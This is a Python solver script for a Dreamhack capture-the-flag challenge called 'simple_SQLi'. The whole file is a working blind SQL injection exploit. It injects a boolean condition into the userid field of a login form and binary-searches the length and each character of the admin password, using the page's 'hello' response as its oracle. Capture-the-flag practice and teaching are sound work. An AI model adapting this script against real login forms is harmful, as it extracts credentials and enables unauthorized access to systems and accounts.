#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge"""

    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host1.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")

    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {"userid": userid, "userpassword": userpassword}
        resp = requests.post(self._login_url, data=login_data)
        return resp

    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f'" or {query}-- ', "hi")
        return resp

    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low + high) // 2
            if low + 1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid

    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f'((SELECT LENGTH(userpassword) WHERE userid="{user}") < {{val}})'
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len

    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ""
        for idx in range(1, pw_len + 1):
            query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))
            print(f"{idx}. {pw}")
        return pw

    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")


if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
